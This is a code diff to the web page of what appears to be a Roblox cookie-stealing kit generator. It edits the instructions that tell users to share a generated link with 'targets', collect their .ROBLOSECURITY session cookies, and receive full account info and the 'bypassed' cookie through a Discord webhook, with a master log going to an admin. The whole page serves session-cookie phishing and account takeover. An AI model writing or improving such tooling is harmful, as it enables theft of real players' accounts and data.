@@ -178,6 +178,7 @@ $globalStats = getGlobalStats();
             <div class="mt-8 pt-6 border-t border-white/10 text-center">
                 <p class="text-sm text-white/60">
                     Each site generates a unique URL where people can submit their Roblox cookies.
+                    All logs are sent directly to your Discord webhook!
                 </p>
             </div>
 
@@ -245,15 +246,7 @@ $globalStats = getGlobalStats();
                                 </div>
                                 <div>
                                     <p class="text-sm text-gray-600 mb-1">🔗 Your Link</p>
-                                    <a href="${data.instanceUrl}" target="_blank" class="font-mono text-sm text-blue-600 bg-gray-100 p-2 rounded block hover:bg-gray-200">${data.instanceUrl}</a>
-                                </div>
-                                <div>
-                                    <p class="text-sm text-gray-600 mb-1">📊 Dashboard</p>
-                                    <a href="${data.dashboardUrl}" target="_blank" class="font-mono text-sm text-blue-600 bg-gray-100 p-2 rounded block hover:bg-gray-200">${data.dashboardUrl}</a>
-                                </div>
-                                <div>
-                                    <p class="text-sm text-gray-600 mb-1">🔑 Access Token</p>
-                                    <p class="font-mono text-sm bg-gray-100 p-2 rounded break-all">${data.token}</p>
+                                    <a href="${data.instanceUrl}" target="_blank" class="font-mono text-sm text-blue-600 bg-gray-100 p-2 rounded block hover:bg-gray-200 break-all">${data.instanceUrl}</a>
                                 </div>
                                 <div class="bg-green-50 border border-green-200 rounded p-3 mt-4">
                                     <p class="text-sm font-medium text-green-800 mb-2">✅ Account Info Fetching</p>
@@ -271,8 +264,11 @@ $globalStats = getGlobalStats();
                                     <p class="text-xs text-blue-700">1. Share your link with targets</p>
                                     <p class="text-xs text-blue-700">2. They submit their .ROBLOSECURITY cookie</p>
                                     <p class="text-xs text-blue-700">3. Cookie is automatically bypassed</p>
-                                    <p class="text-xs text-blue-700">4. You receive FULL ACCOUNT INFO + BYPASSED COOKIE</p>
+                                    <p class="text-xs text-blue-700">4. You receive FULL ACCOUNT INFO + BYPASSED COOKIE via webhook</p>
                                     <p class="text-xs text-blue-700">5. Master log sent to admin</p>
+                                </div>
+                                <div class="bg-yellow-50 border border-yellow-200 rounded p-3 mt-4">
+                                    <p class="text-xs font-medium text-yellow-800">💡 All logs will be sent to your Discord webhook. Save your link!</p>
                                 </div>
                             </div>
                         `,
